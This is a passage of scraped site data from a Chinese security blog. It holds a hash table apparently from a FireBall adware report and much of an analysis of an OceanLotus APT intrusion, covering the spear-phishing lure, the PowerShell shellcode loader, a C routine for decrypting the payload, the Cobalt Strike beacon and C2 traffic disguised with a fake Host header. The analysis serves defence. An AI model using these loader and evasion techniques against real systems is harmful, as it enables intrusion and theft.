c9983b0df901aa34d4138</td>\n</tr>\n<tr>\n<td>4d9fdae25dba70071ad04e3</td>\n</tr>\n<tr>\n<td>8f1357b6125519e92cf6887</td>\n</tr>\n<tr>\n<td>03868ce02e46b22654ffce0e</td>\n</tr>\n<tr>\n<td>46efd3855f0568fa5409106</td>\n</tr>\n<tr>\n<td>82bb58847896d39ccb05019</td>\n</tr>\n<tr>\n<td>f325a542e9e6ec21526dda2</td>\n</tr>\n<tr>\n<td>a936498897b65362a9c04e4</td>\n</tr>\n<tr>\n<td>1abca21bfef26f169094507</td>\n</tr>\n<tr>\n<td>ac2f367ed855f274720d4f9</td>\n</tr>\n<tr>\n<td>f0c71b643d229253db1cb2d</td>\n</tr>\n<tr>\n<td>6d72a1aa82831b8d9ef3e9e</td>\n</tr>\n<tr>\n<td>c8176afc7a2c4dae59c4d64</td>\n</tr>\n<tr>\n<td>2d6211f2ccbd29a57c3d891</td>\n</tr>\n<tr>\n<td>11afa9a801bbec09abf6503</td>\n</tr>\n<tr>\n<td>6507b651ab41ff28d9344e5</td>\n</tr>\n<tr>\n<td>eaedc713d5ec13a8c7ec9cd</td>\n</tr>\n<tr>\n<td>4c0db6da0580642a6ee5e0e</td>\n</tr>\n<tr>\n<td>9287fea508dfa2432beb5e1</td>\n</tr>\n<tr>\n<td>c0e35a48b5a946940776186</td>\n</tr>\n<tr>\n<td>a42335bf508efb37cc488fd</td>\n</tr>\n<tr>\n<td>50b9a26a3326340e61c949a</td>\n</tr>\n<tr>\n<td>d06dcaef4f6150dc02709655</td>\n</tr>\n<tr>\n<td>5523f2306c6f863026a8137</td>\n</tr>\n<tr>\n<td>899958d067cdb22f6bf5312</td>\n</tr>\n<tr>\n<td>0c22683be436a09b382fabf</td>\n</tr>\n<tr>\n<td>1a83864b1b24e06f6960abe2</td>\n</tr>\n<tr>\n<td>4826b0a73be84788ac44b6e</td>\n</tr>\n<tr>\n<td>375beb8a67c217d5dab383c</td>\n</tr>\n<tr>\n<td>3ba0ebdb38cb0de046464dc</td>\n</tr>\n<tr>\n<td>74b4466c8bbb2c6bdd2a72f</td>\n</tr>\n<tr>\n<td>1ab38705c7a1f76ae3d46dc</td>\n</tr>\n<tr>\n<td>07046c9d2d5ed5761b34ada</td>\n</tr>\n<tr>\n<td>af43a456ff76c806c24f749</td>\n</tr>\n<tr>\n<td>592d3c20bbfa8fee3195b68</td>\n</tr>\n<tr>\n<td>4b1bcf947c02ac6529e4796</td>\n</tr>\n<tr>\n<td>ccaa9e10d640e6a5606da40</td>\n</tr>\n<tr>\n<td>1573ea3ab41a03fd3811c52</td>\n</tr>\n<tr>\n<td>d13d096ca40164bd2d28b67</td>\n</tr>\n<tr>\n<td>d23ad0104ba9c9a50ca35f6</td>\n</tr>\n<tr>\n<td>43b6c7afdd1dbee5e60891d</td>\n</tr>\n<tr>\n<td>154f4b78ff0034adf6845af</td>\n</tr>\n<tr>\n<td>ec1414f5739a13d9e0404be</td>\n</tr>\n<tr>\n<td>32f0aeaed60d2a09c6017de</td>\n</tr>\n<tr>\n<td>0f86f2dfb068b3603565316</td>\n</tr>\n<tr>\n<td>75ea71ca50e2a5f98c1c5b5</td>\n</tr>\n<tr>\n<td>ceaaaab99e5a680f056685f</td>\n</tr>\n<tr>\n<td>4308eac37579ef3d59efb7bf</td>\n</tr>\n<tr>\n<td>927d26a5ce8ace59f2c2903</td>\n</tr>\n<tr>\n<td>53c5d7d41a48ed5c5b3fa46</td>\n</tr>\n<tr>\n<td>9fed5aee9ebb18c2d13f4d8d</td>\n</tr>\n<tr>\n<td>aaff258edabc11dee88c9c3</td>\n</tr>\n<tr>\n<td>516625b17834c012b81944c</td>\n</tr>\n<tr>\n<td>7f112544163121517fb3ec5</td>\n</tr>\n<tr>\n<td>b5c40a8c2f72095426b215ef</td>\n</tr>\n<tr>\n<td>06e21b58de19e4f0b50da8c</td>\n</tr>\n<tr>\n<td>ed10c86949d2d6b36f31a073</td>\n</tr>\n<tr>\n<td>5d6ffe8a4dab59a77da16d2</td>\n</tr>\n<tr>\n<td>e3acdb948c7e12be58a0fa2</td>\n</tr>\n<tr>\n<td>2dab11fe8e87e3d3c496991</td>\n</tr>\n<tr>\n<td>848410595208cd1b06710434</td>\n</tr>\n<tr>\n<td>04594f2221bf2a4426be86b8</td>\n</tr>\n<tr>\n<td>11fdfa8058665862c2491d0</td>\n</tr>\n<tr>\n<td>6dfce40aa0b0210293142c6</td>\n</tr>\n<tr>\n<td>6eff0cf62efdb23b544619a</td>\n</tr>\n<tr>\n<td>4a33948583131dba297e7050</td>\n</tr>\n<tr>\n<td>b08a464d8a44d3d9b2d7136</td>\n</tr>\n<tr>\n<td>c970e810a647f304f3b38a0</td>\n</tr>\n<tr>\n<td>df6551a21765b6b2bf38fea</td>\n</tr>\n<tr>\n<td>20a535dd73498cde5330dbb6</td>\n</tr>\n<tr>\n<td>c0041cda2306cfd34dae4bb</td>\n</tr>\n<tr>\n<td>15f149739b983e76c94c7325</td>\n</tr>\n<tr>\n<td>3a494ede215a2b35d5c4fa2</td>\n</tr>\n<tr>\n<td>9ffd354b1ec493a249ada2b</td>\n</tr>\n<tr>\n<td>bde635666f2070d2228bf68</td>\n</tr>\n<tr>\n<td>2d8bacbfbcee1e2ac34b59e</td>\n</tr>\n<tr>\n<td>ca035e50a48c5eeca1a1466</td>\n</tr>\n<tr>\n<td>54acb8105603b7cce40cdd11</td>\n</tr>\n<tr>\n<td>1401bd81b21a82f3f93d2c2f</td>\n</tr>\n<tr>\n<td>bd80a27bd54cdf8cd664ec0</td>\n</tr>\n<tr>\n<td>d094db815de2ec0fe74262a</td>\n</tr>\n<tr>\n<td>d250aa06a2162ef59f8fdd6c</td>\n</tr>\n<tr>\n<td>4c4a8769265138f1f5b1328</td>\n</tr>\n<tr>\n<td>2d1f5510e38196bcd372f82</td>\n</tr>\n<tr>\n<td>101e57f0d6e2538f4fbbdb</td>\n</tr>\n<tr>\n<td>39e2aa3ef0b189998c1f479c</td>\n</tr>\n<tr>\n<td>a443a5d73772b6c16bc01c7</td>\n</tr>\n<tr>\n<td>bf5c848ac062a22864c57a4a</td>\n</tr>\n<tr>\n<td>7fa506d568a227d7ffd61635</td>\n</tr>\n<tr>\n<td>29ed8a96ae0d0f30a888d2ed</td>\n</tr>\n<tr>\n<td>569c7c55edcf49a85d8ecba3</td>\n</tr>\n<tr>\n<td>885ff3b62e6e786ea684968</td>\n</tr>\n<tr>\n<td>a33a3776c949b288b63fcec</td>\n</tr>\n<tr>\n<td>99593b89d1aa0361711f318</td>\n</tr>\n<tr>\n<td>85a42ad643290396f88a29ff</td>\n</tr>\n<tr>\n<td>cd18711f026a8276e156216</td>\n</tr>\n<tr>\n<td>d6abb745973782448913651e</td>\n</tr>\n<tr>\n<td>e9ad4e23a733bb76cbdc3785</td>\n</tr>\n<tr>\n<td>a82370c9de4e21fd509d498</td>\n</tr>\n<tr>\n<td>404ee03ebe5be0d1da99ac6</td>\n</tr>\n<tr>\n<td>fe692516b6f78f25824f3a2</td>\n</tr>\n<tr>\n<td>e6eebc705ff9a76021a6cd0</td>\n</tr>\n<tr>\n<td>ce836231e37e20851564c8e</td>\n</tr>\n<tr>\n<td>479e97c7c59c7c13ffddbfc</td>\n</tr>\n<tr>\n<td>dd753e55ab4cb6d539a5128a</td>\n</tr>\n<tr>\n<td>c69cb94c40133ab5485bac0</td>\n</tr>\n<tr>\n<td>4d1a72924be52d18ac0e87c</td>\n</tr>\n<tr>\n<td>0a966bc2c67201ec5f7428b</td>\n</tr>\n<tr>\n<td>def40d198e3df5ef3b108641</td>\n</tr>\n<tr>\n<td>eb91d33e7cd5ceb56299718</td>\n</tr>\n<tr>\n<td>ab84ecb202b31d31de80df4</td>\n</tr>\n<tr>\n<td>7657ce5356dd16d17b48a0e</td>\n</tr>\n<tr>\n<td>91e26fa373692f8b2bc48d9b</td>\n</tr>\n<tr>\n<td>7bd2b9739040eb0854bdd73</td>\n</tr>\n<tr>\n<td>1216a81945e15ed2ad4cfdbb</td>\n</tr>\n<tr>\n<td>4b6c94573df2f49f8cfc1a</td>\n</tr>\n<tr>\n<td>3be03650742fd684cbed23e</td>\n</tr>\n<tr>\n<td>7bc4e0ea6308422ef8d6ce9</td>\n</tr>\n<tr>\n<td>f05e05015055d72b2c45ab6</td>\n</tr>\n<tr>\n<td>c7f8765d790f36fdf46ee00</td>\n</tr>\n<tr>\n<td>d15f56cce40a1285e9888d2</td>\n</tr>\n<tr>\n<td>21b3af9f0732adae3bd55bcb</td>\n</tr>\n<tr>\n<td>06b6bf05dc0de71de6adb7e</td>\n</tr>\n<tr>\n<td>9eec51f08dfa78ce40ffe9b</td>\n</tr>\n<tr>\n<td>941a8fce41c1c854c83e928</td>\n</tr>\n<tr>\n<td>38218be510f39bd7d44bef12</td>\n</tr>\n<tr>\n<td>9304ae12460533fa865ab1d</td>\n</tr>\n<tr>\n<td>b97c77df6789a0a051ff6dd</td>\n</tr>\n<tr>\n<td>d1ad60901472396c7ac5d4f</td>\n</tr>\n<tr>\n<td>7e90c9d0152a6e6bcb553ad</td>\n</tr>\n<tr>\n<td>bdf6a65bfa1add5a4a40036</td>\n</tr>\n<tr>\n<td>4672aa1efb250bbb3fa3620</td>\n</tr>\n<tr>\n<td>51ddbcec36f862e5b639b8ed</td>\n</tr>\n<tr>\n<td>b7bd6c0cadb47e2eff30b349</td>\n</tr>\n<tr>\n<td>68d0a3c58f9b07471ef9e6f</td>\n</tr>\n<tr>\n<td>d9c03c645440c6a44780d915</td>\n</tr>\n<tr>\n<td>802fc7548f1cc38d8c5a74a</td>\n</tr>\n<tr>\n<td>1346eb18db47a6e46d1e9b0</td>\n</tr>\n<tr>\n<td>4c3518d96c43f6560e93fc3</td>\n</tr>\n<tr>\n<td>eb57b2fe96d63e54badceff</td>\n</tr>\n<tr>\n<td>35792aece8a3b160a0fa242</td>\n</tr>\n<tr>\n<td>83cb8d24537c364af50c0b34</td>\n</tr>\n<tr>\n<td>4cb4795437418793a4fad53</td>\n</tr>\n<tr>\n<td>a6447e55f83f2d0756365a5</td>\n</tr>\n<tr>\n<td>2c850e12d3a9facf1d30983</td>\n</tr>\n<tr>\n<td>dbd0425cb3cf293f83341f8</td>\n</tr>\n<tr>\n<td>2af3e9a9c7f9bcd4fcf2ad3</td>\n</tr>\n<tr>\n<td>74b731a329ab4828b87d885</td>\n</tr>\n<tr>\n<td>83d26fbb9ad87ebc911749f</td>\n</tr>\n<tr>\n<td>a087f7b7d9814d1d79a993e</td>\n</tr>\n<tr>\n<td>11bfb73cc21ff837f25f326</td>\n</tr>\n<tr>\n<td>9451693254158630924c715</td>\n</tr>\n<tr>\n<td>06ceed21f370f463ecc5ab7</td>\n</tr>\n<tr>\n<td>30288aee7fff016dfb05c96</td>\n</tr>\n<tr>\n<td>dc7023f5344df12a96a6892</td>\n</tr>\n<tr>\n<td>35d1676127b7853393710a3</td>\n</tr>\n<tr>\n<td>2c1e3b7716f2a9b162d305f</td>\n</tr>\n<tr>\n<td>42fe4f248f62a11e28fd8a0</td>\n</tr>\n<tr>\n<td>51790e4d6f424ea26c83b0a</td>\n</tr>\n<tr>\n<td>27f854538c9427a27a27e9c</td>\n</tr>\n<tr>\n<td>89b903424188fd07183aa93</td>\n</tr>\n<tr>\n<td>84a3f821429b77611d6a8ca</td>\n</tr>\n<tr>\n<td>47c91727db8191628e846ef</td>\n</tr>\n<tr>\n<td>5073701128985dbeb635a84</td>\n</tr>\n<tr>\n<td>3f0bce382c208ff0a085264</td>\n</tr>\n<tr>\n<td>69f28695c02463bbec38f05</td>\n</tr>\n<tr>\n<td>5aca2cb44f15663da9391e2</td>\n</tr>\n<tr>\n<td>c93973843b65a2b07a6a0ea</td>\n</tr>\n<tr>\n<td>e2057e74a843d604d0d4103</td>\n</tr>\n<tr>\n<td>72ac63f4d4fd2884b32248d</td>\n</tr>\n<tr>\n<td>21ef2a8eb83e81a8c338f81</td>\n</tr>\n<tr>\n<td>adf2fe383abf25fd3ac7e69</td>\n</tr>\n<tr>\n<td>064fb6e0fd1bde0a7eeb800</td>\n</tr>\n<tr>\n<td>3f5c6ffa96cbe4abc5fcd15</td>\n</tr>\n<tr>\n<td>b9f097bee8542a72f9ad6f0</td>\n</tr>\n<tr>\n<td>cd5f9ab395c87b844a72e35</td>\n</tr>\n<tr>\n<td>e8ba436ce9829974141a33a</td>\n</tr>\n<tr>\n<td>58ecc95bd53098c6b6f3f9b</td>\n</tr>\n<tr>\n<td>8860c4e8c61484c24f0fdac</td>\n</tr>\n<tr>\n<td>81d3c19f0c23f2babfeb841</td>\n</tr>\n<tr>\n<td>7cc9c0bc112540728e64f18</td>\n</tr>\n<tr>\n<td>d575d64c06a77f1e6667e48</td>\n</tr>\n<tr>\n<td>c8a56d4d70bc0d7b5eb74c1</td>\n</tr>\n<tr>\n<td>783e8e92da02571785e9ea1</td>\n</tr>\n<tr>\n<td>3242f7e86f8bfa9a4fe5962d</td>\n</tr>\n<tr>\n<td>01b76bde633261caad4deda</td>\n</tr>\n<tr>\n<td>9aea62c4c4ad1202adff53c3</td>\n</tr>\n<tr>\n<td>82a53d6ab21562b6fd22bdc</td>\n</tr>\n<tr>\n<td>270f0dd5e2e68f527e19320</td>\n</tr>\n<tr>\n<td>9271154b4fac852da8acdcdd</td>\n</tr>\n<tr>\n<td>5268509f00c145fb9d34d70</td>\n</tr>\n<tr>\n<td>a5ca306bedaefdcc5a32125</td>\n</tr>\n<tr>\n<td>c0ca122fe4921a042777356</td>\n</tr>\n<tr>\n<td>4402b259f51cb7179acebd0</td>\n</tr>\n<tr>\n<td>fd5d5474ae534e98fc50c03</td>\n</tr>\n<tr>\n<td>568d2f3ad03a80d3059c3844</td>\n</tr>\n<tr>\n<td>af42ba7f31660b7a0e5f998</td>\n</tr>\n<tr>\n<td>87773dc8ff063b85c4ae3a6</td>\n</tr>\n<tr>\n<td>f5b4830d10ab8128ad6de46</td>\n</tr>\n<tr>\n<td>605aab9a574754de82ac48c8</td>\n</tr>\n<tr>\n<td>3efc6b631010f4154f860b5</td>\n</tr>\n<tr>\n<td>756e1f71bda715a336e68c4d</td>\n</tr>\n<tr>\n<td>310b366edcc2278bcee5473</td>\n</tr>\n<tr>\n<td>e84a8d59df61f563caf53f8</td>\n</tr>\n<tr>\n<td>50dc97dfebb9b4f4112b6b7</td>\n</tr>\n<tr>\n<td>3693bf04bdb94c33c953e68</td>\n</tr>\n<tr>\n<td>f44fbbb67534040ff54d64b</td>\n</tr>\n<tr>\n<td>a9074edc43ba8d3131117b2</td>\n</tr>\n<tr>\n<td>459d4b18775f666faff639a</td>\n</tr>\n<tr>\n<td>ff57214ada89ce35b36165d</td>\n</tr>\n<tr>\n<td>50443c4950df130bf4dae14</td>\n</tr>\n<tr>\n<td>836d46da90baf413e9e3944b</td>\n</tr>\n<tr>\n<td>0ef385e75453b4fd4107c63</td>\n</tr>\n<tr>\n<td>620a19eb23b722cf3bccf85</td>\n</tr>\n<tr>\n<td>d586eddd4c4e31c6abfba0a</td>\n</tr>\n<tr>\n<td>f3e327c7e2360750127cf45</td>\n</tr>\n<tr>\n<td>1aa0165587737c9fc2c9bf4</td>\n</tr>\n<tr>\n<td>9c7266c4b8fc3bd19c90f03f</td>\n</tr>\n<tr>\n<td>84fb6b3b17924776285cd2e</td>\n</tr>\n<tr>\n<td>f673c668ee2dba5248ba6e</td>\n</tr>\n<tr>\n<td>409fb7fbb8e79e4f9cced24</td>\n</tr>\n<tr>\n<td>c92d439e41a6f3d9a13e38d</td>\n</tr>\n<tr>\n<td>06ed5ab207c80c288570685</td>\n</tr>\n<tr>\n<td>be1acbacb310081981b9b2e</td>\n</tr>\n<tr>\n<td>cda0b34787431b63bebf5a8</td>\n</tr>\n<tr>\n<td>394d37d25f67ebe8b5b2580</td>\n</tr>\n<tr>\n<td>c5862288e22430dcb094ab4</td>\n</tr>\n<tr>\n<td>fa2195e06ee791d94cf1750</td>\n</tr>\n<tr>\n<td>76bfb5186c6ded86b4cb522</td>\n</tr>\n<tr>\n<td>189865fd7810fcef63cd4b</td>\n</tr>\n<tr>\n<td>570826da4024a8aa7e3a1e7</td>\n</tr>\n<tr>\n<td>a5696e02c86a12fc28db65f</td>\n</tr>\n<tr>\n<td>3c19ca75959c5919d1a3a5a</td>\n</tr>\n<tr>\n<td>9cf79386712c5ec7f337029</td>\n</tr>\n<tr>\n<td>5779f4715c50d8474e52ed</td>\n</tr>\n<tr>\n<td>99b9970141bba3879985c817</td>\n</tr>\n<tr>\n<td>c38828d1ca0f5631f249f40</td>\n</tr>\n<tr>\n<td>113a9249d2791c120ad190b</td>\n</tr>\n<tr>\n<td>181aa72f9291d779d39e364</td>\n</tr>\n<tr>\n<td>f89fb8551f54d4c5959bf24</td>\n</tr>\n<tr>\n<td>c69729fca11bdb8983325f7</td>\n</tr>\n<tr>\n<td>84a539471b6af044988ec5e</td>\n</tr>\n<tr>\n<td>51407df2c9dbb726195833ac</td>\n</tr>\n<tr>\n<td>b5ffb15e73f77146dcb7790</td>\n</tr>\n<tr>\n<td>eb5aeb1c85a5cf24bdfe88c</td>\n</tr>\n<tr>\n<td>375ae0fedd8978132f10315</td>\n</tr>\n<tr>\n<td>754fc7959718795e96cd080</td>\n</tr>\n<tr>\n<td>7d93c8c36a5c07a42a386af</td>\n</tr>\n<tr>\n<td>dcb268f9874ef6b49c50440d</td>\n</tr>\n<tr>\n<td>36e4099e33ca542cfad976b</td>\n</tr>\n<tr>\n<td>7a082681d3cef928696511c</td>\n</tr>\n<tr>\n<td>fce6e5a42c029bf9baadcff</td>\n</tr>\n<tr>\n<td>23a2fc0615852f0c14aca6c2</td>\n</tr>\n<tr>\n<td>37c4486d6c183b744773915</td>\n</tr>\n<tr>\n<td>ea273ab40f5449ded2a212d</td>\n</tr>\n<tr>\n<td>036bc1b9749584061def972</td>\n</tr>\n<tr>\n<td>ed974d66bcabc61b1d6fc82</td>\n</tr>\n<tr>\n<td>0520f3c9969fe17cc2199ce</td>\n</tr>\n<tr>\n<td>1691db44325ff96b614b7b2d</td>\n</tr>\n<tr>\n<td>0c2cb7bf8a685f0a4a0915f9</td>\n</tr>\n<tr>\n<td>72bfdbd01138cea2e7db51a</td>\n</tr>\n<tr>\n<td>2bf2a398ff75cbba15f028ec</td>\n</tr>\n<tr>\n<td>585b4da5834cb22fda5bc63</td>\n</tr>\n<tr>\n<td>2a1c6a13c901da76f9e9063</td>\n</tr>\n<tr>\n<td>f78227f5a17bde974905755</td>\n</tr>\n<tr>\n<td>f973e5b9bbfae6f0a17fe24</td>\n</tr>\n<tr>\n<td>e0916670e05c59645cfe6e7</td>\n</tr>\n<tr>\n<td>4ffd9d460a90637a10f7a08</td>\n</tr>\n<tr>\n<td>d6406b99dd0a8effc7803fd</td>\n</tr>\n<tr>\n<td>cccbb9064b1f8fa693679ba</td>\n</tr>\n<tr>\n<td>b5279b6c72058faf800e4e0</td>\n</tr>\n<tr>\n<td>7c363363e6e407f5167f881</td>\n</tr>\n<tr>\n<td>51831fc122687bbbcdb60ed</td>\n</tr>\n<tr>\n<td>026616e8f58d510266a1b1b</td>\n</tr>\n<tr>\n<td>da58a3b3fa2ae76df1941a5</td>\n</tr>\n<tr>\n<td>faff92282ace51e8a585a87</td>\n</tr>\n<tr>\n<td>9589a4aac28afda7c5d2ac1</td>\n</tr>\n<tr>\n<td>1b0d864c00b2c546c51f930</td>\n</tr>\n<tr>\n<td>d0078c94171e40b0b54f0f0</td>\n</tr>\n<tr>\n<td>3330880fd09cb849411c7d1</td>\n</tr>\n<tr>\n<td>32b4ae706f73025beda525f</td>\n</tr>\n<tr>\n<td>0c02d6ef93109bc031a2d3e</td>\n</tr>\n<tr>\n<td>2b54381adeaf4398c8e48f4</td>\n</tr>\n<tr>\n<td>c34078a7ac98ae5f7af52d4</td>\n</tr>\n<tr>\n<td>dc7cbf42b690937cb41b54e</td>\n</tr>\n<tr>\n<td>3c4fb350429dbd93a64c4e0</td>\n</tr>\n<tr>\n<td>5ed08e53910df1c218c138</td>\n</tr>\n<tr>\n<td>92b132450c72e5c61b78d34</td>\n</tr>\n<tr>\n<td>1e3c9acc8f4e0b053261458</td>\n</tr>\n<tr>\n<td>30549c1cef1b0bdf2159cdf</td>\n</tr>\n<tr>\n<td>b94220f94e8308f58b4672b</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="718">参考链接</h2>\n<p class="line" data-line="720"><a href="http://blog.checkpoint.com/2017/06/01/fireball-chinese-malware-250-million-infection/">FIREBALL – The Chinese Malware of 250 Million Computers Infected</a></p>\n',category:"专题报告",__v:1,abstract:"2017年6月1日，Checkpoint发布了文章`FIREBALL – The Chinese Malware of 250 Million Computers Infected`，涉及一款被其命名为FireBall的流氓软件，声称在全球感染了近2亿5千万的机器。报告认为这次感染事件的源头是一家注册于中国北京的名为Rafotech的科技公司，其使用Fireball软件修改用户的Chrome浏览器的默认搜索引擎，将用户的默认搜索指向该公司自己的搜索页面并将用户的查询重定向到yahoo\\.com或者google\\.com的页面。这个转向搜索页面可能会用来收集用户的个人信息，此外，报告中认为Fireball有可能被用来下载更多的木马程序。",modify_time:"2017-08-01T08:54:42.577Z",readableId:"fireball-adware-analysis",publish_time:"2017-06-06T11:31:39.000Z",descImg:"/uploads/2017/08/01/b0f7f0d4156f5b3fb0a153345e16f289.png",insert_time:"2017-07-25T12:03:51.335Z",isDraft:!1,tags:["FireBall","adware"]},{_id:"597733a71c670a09e493ee3c",title:"海莲花重出水面",author:"admin",content:'<h2 class="line" data-line="0">引子</h2>\n<p class="line" data-line="2">2015年5月底360天眼实验室发布了海莲花APT组织相关活动的报告，揭露了多年来一系列对我国的关键部门进行针对性攻击窃取机密信息的攻击活动。</p>\n<p class="line" data-line="4">相关的报告：<a href="https://ti.360.com/upload/report/file/OceanLotusReport.pdf">https://ti.360.com/upload/report/file/OceanLotusReport.pdf</a></p>\n<p class="line" data-line="6">APT相关的活动事实上是情报战在网络空间的延伸，其中很大部分属于国家级的对抗，我们的攻击者很多在国门之外，对其的打击已超出了相对简单的技术对抗的范畴。而如果不能从组织和人员的层面上解决问题，那么公开的揭露只会促使其采用的新攻击方式的缓解措施而已，过不多久攻击就会改头换面卷土重来。现实验证了我们的推断，从天眼实验室跟踪的多个APT团伙及其活动来看，从未有什么团伙在被揭露以后而全面停止活动的，从未。</p>\n<p class="line" data-line="8">在发布海莲花报告一年多的今天，我们也一直在持续监测着海莲花团伙的活动，从未间断，而更多监控能力的引入使我们把对手的活动看得更清晰。最近的大网数据显示在4月份就发生了数百例新的感染，威胁丝毫没有出现缓解的迹象，本文会通过介绍一个真实的案例来展现相关的细节。</p>\n<h2 class="line" data-line="10">案例</h2>\n<p class="line" data-line="12">这是一个观察到的真实海莲花新近攻击活动，360的天眼威胁感知与天擎终端安全产品使我们能够对网络和主机上发生的事情做集中化的关联分析，让完整攻击活动的来龙去脉实现准实时的感知和展现。</p>\n<h3 class="line" data-line="14">初始进入</h3>\n<p class="line" data-line="16">小王是一个供职于某个敏感机构的员工，他的部分工作涉及对外的联络，于是他的电子邮箱地址与其他一些同事的一起被公布在单位对外的网站上，后续的取证发现几乎全部这些对外公布的邮箱都被投递了恶意代码。</p>\n<p class="line" data-line="18">2016年4月的某一天，他从邮箱里收到一个好像来自上级的邮件，内容很简略，说的是所在单位的审核计划。当然，如我们所知的鱼叉邮件攻击那样，邮件还带了一个文件名为“2016年度上级及内部审核计划.rar”的附件。</p>\n<p class="line" data-line="20">不奇怪的，像大多数不太小心的员工那样，小王点击附件打开了RAR压缩包，里面有个名为“关于发布《2016年度上级及内部审核计划》的通知.exe”的文件，在资源管理器里显示的是Microsoft Word文档的图标：</p>\n<p class="text-center line" data-line="22"><img src="/uploads/2017/07/25/3b1e4b3119f2f76a8db6c017ec1dc8d0.png" alt=""></p>\n<p class="line" data-line="24">其实这是一个典型的可执行程序，双击就会运行起来。觉得这种直接发可执行程序的方式很低端？事实上大部分的定向攻击并不利用漏洞，更不用说0day漏洞了，它们更多地依赖社会工程学的技巧，利用人性的弱点：恐惧、贪婪和好奇心。如果邮件内容与对象的工作看起来有足够的相关性，即使是一个EXE文件，被点击的可能性也会变得非常大，而且，EXE文件相比漏洞利用型的攻击相比有着无与伦比的环境兼容性。</p>\n<p class="line" data-line="26">这时，攻击行动到达了关键点，小王如果有良好的安全意识，知道来历不明的可执行程序不可乱点甚至提交给IT部门做分析确认，那攻击就到此为止了。可惜小王没有丝毫戒心地点击了，以下的事情在电脑后台发生了，而受害者小王对此一无所知。</p>\n<p class="line" data-line="28">被执行起来的程序其实就是OceanLotus Encryptor的一个简单变化版本，行为与天眼实验室去年发布报告后有同学对样本做的分析基本一致，详细分析可以参考FreeBuf上的文章：</p>\n<p class="text-center line" data-line="30"><a href="http://www.freebuf.com/articles/system/69356.html">技术剖析：海莲花OceanLotus Encryptor样本分析</a></p>\n<p class="line" data-line="32">总之，经过层层解密自身，程序最终连接到外部的C&amp;C服务器，接收进一步的指令：从另一个服务器下载执行某个模块以获取进一步的控制或实现持久化或完成特定的功能。</p>\n<p class="line" data-line="34">具体的操作：</p>\n<p class="line" data-line="36">伪装成QQ程序的qq.exe进程从 hxxp://***.***.***.***/images/logo.png 下载一个看起来是PNG图片的文件。</p>\n<p class="line" data-line="38">下载回来打开就会发现这其实是一个Powershell脚本，其主要工作就是把内置的Shellcode加载到内存中执行：</p>\n<p class="text-center line" data-line="40"><img src="/uploads/2017/07/25/9715682f68217b51fcb7389ebf628fd9.png" alt="" width="90%"></p>\n<p class="line" data-line="42">var_code中数据Base64解码以后根据经验可以断定是Shellcode：</p>\n<p class="text-center line" data-line="44"><img src="/uploads/2017/07/25/4ca5779eadd8c5eeec8516119e5fbddc.png" alt="" width="90%"></p>\n<p class="line" data-line="46">最前面0x34字节的Shellcode负责解密0x34偏移后的数据：</p>\n<p class="text-center line" data-line="48"><img src="/uploads/2017/07/25/de0870839baab8f9290156c1e4cabbbd.png" alt="" width="90%"></p>\n<p class="line" data-line="50">从数据的0x34偏移开始为加密段，数据的结构为：</p>\n<pre class="hljs"><code class="hljs">struct CodeData\n{\n    DWORD dwInitXorCode; //初始密钥\n    DWORD dwLength; //紧跟在后面的恶意代码加密后的长度（解密是和dwInitXorCode异或）\n    Byte* bData;//编码的恶意代码的内容\n}\n</code></pre>\n<p class="text-center line" data-line="61"><img src="/uploads/2017/07/25/0537be07feac5441e2a34ed70fa5557b.png" alt="" width="90%"></p>\n<p class="line" data-line="63">解密后确认数据构成一个PE文件，如下代码为解密算法：</p>\n<pre class="hljs"><code class="hljs">void Decode()\n{\n\tDWORD dwFirst = 0;\n\tDWORD dwSecond = 0;\n\tmemcpy((void*)&dwFirst, data+0x34, 4);\n\tmemcpy((void*)&dwSecond, data+0x38, 4);\n\tDWORD dwLength = dwSecond ^ dwFirst;\n\t\n\tDWORD dwXorCode = dwFirst;\n\tunsigned char* szNewBuffer = new unsigned char[dwLength];\n\tmemset(szNewBuffer, 0, dwLength);\n\tfor (int i = 0; i < dwLength; i+=4)\t{\n\t\tDWORD dwBuffer = 0;\n\t\tmemcpy((void*)&dwBuffer, data+0x38+4+i, 4);\n\t\tDWORD dwNewBuffer = 0;\n\t\tdwNewBuffer = dwBuffer^dwXorCode;\n\t\tdwXorCode = dwXorCode^dwNewBuffer;\n\t\tmemcpy(szNewBuffer+i, (void*)&dwNewBuffer, 4); //szNewBuffer为解密后的数据\n\t}\n}\n</code></pre>\n<p class="line" data-line="88">解密后的文件是DLL模块：</p>\n<p class="text-center line" data-line="90"><img src="/uploads/2017/07/25/5541dcfd3ec432f24c50f4d1a1e6de1c.png" alt="" width="90%"></p>\n<p class="line" data-line="92">DLL文件的导出模块名为beacon_dll.dll：</p>\n<p class="text-center line" data-line="94"><img src="/uploads/2017/07/25/f18509abd38326e60b06144e0f34b312.png" alt=""></p>\n<p class="line" data-line="96">通过对该DLL的分析发现，入口处会把0x1002e040处的数据通过和0x69异或解密，数据长度为1552字节；如图：</p>\n<p class="text-center line" data-line="98"><img src="/uploads/2017/07/25/ccb5ed9ba394839426a3433559a8ccc6.png" alt="" width="90%"></p>\n<p class="line" data-line="100">解密后可以看到配置信息，里面包含进行通信的C&amp;C地址、Url、UserAgent和亚马逊的域名（为了填充远控协议的HTTP头的Host字段）等配置信息：</p>\n<p class="text-center line" data-line="102"><img src="/uploads/2017/07/25/47439095cdacfc81a41c7f9418b4b315.png" alt="" width="90%"></p>\n<p class="line" data-line="104">抓包发现木马在进行HTTP隧道通信的时候还耍了点小花招，在请求的Host字段填了知名站点的网址，传输的内容经过编码后放到Cookies字段里，试图混淆视听绕过监测，而伪装的Host就是在配置信息里；如图：</p>\n<p class="text-center line" data-line="106"><img src="/uploads/2017/07/25/fd6157e67c1b6fcb32d5be9cc6fdec74.png" alt="" width="90%"></p>\n<p class="line" data-line="108">数据包的HTTP头的Host字段为www.amazon.com，而连接的IP地址为***.***.***.***，该IP为木马的C&amp;C地址，Host字段填的为知名网站，如图：</p>\n<p class="text-center line" data-line="110"><img src="/uploads/2017/07/25/fd2d962f58bc1b623dc59fea40cd7234.png" alt="" width="90%"></p>\n<p class="line" data-line="112">而***.***.***.***这个IP从来就没有绑定过域名<code>www.amazon.com</code>。</p>\n<h3 class="line" data-line="114">渗透工具</h3>\n<p class="line" data-line="116">分析到这儿对现在泛滥成灾的基于Powershell的攻击框架熟悉的同学可能已经看出来了，这个攻击荷载就是大名鼎鼎的商业渗透工具Cobalt Strike生成的，去年友商也发现过海莲花团伙使用Cobalt Strike框架进行APT攻击。</p>\n<p class="line" 